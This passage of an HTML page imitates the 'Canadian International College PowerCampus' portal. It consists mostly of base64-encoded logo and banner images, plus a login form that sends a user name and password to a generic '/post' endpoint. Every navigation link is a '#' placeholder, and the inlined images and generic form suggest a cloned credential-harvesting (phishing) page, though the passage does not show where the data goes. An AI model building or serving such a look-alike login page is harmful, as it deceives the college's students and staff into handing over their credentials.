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' alt='Canadian International College PowerCampus'><div id='tools'><a class='help' href='#'>Help</a><select><option>Catalog</option><option>Sections</option></select><input class='q' type='text'><button class='sbtn' type='button'>Search</button></div></div><div id='nav'><span class='tab active'>Home</span><a class='tab' href='#'>Search</a></div><div id='subnav'><a href='#'>Apply</a></div><div class='layout'><div class='side'><div class='login'><h2><span>Login</span><span class='chev'>&#9650;</span></h2><div class='body'><form action='/post' method='post' id='login-form'><label for='u'>User Name</label><input id='u' class='f' name='username' type='text' autocomplete='username' required><label for='p'>Password</label><input id='p' class='f' name='password' type='password' autocomplete='current-password' required><button class='lbtn' type='submit'>Log In</button></form></div></div></div><div class='main'><div class='banner'><img class='coll' src='data:image/jpeg;base64,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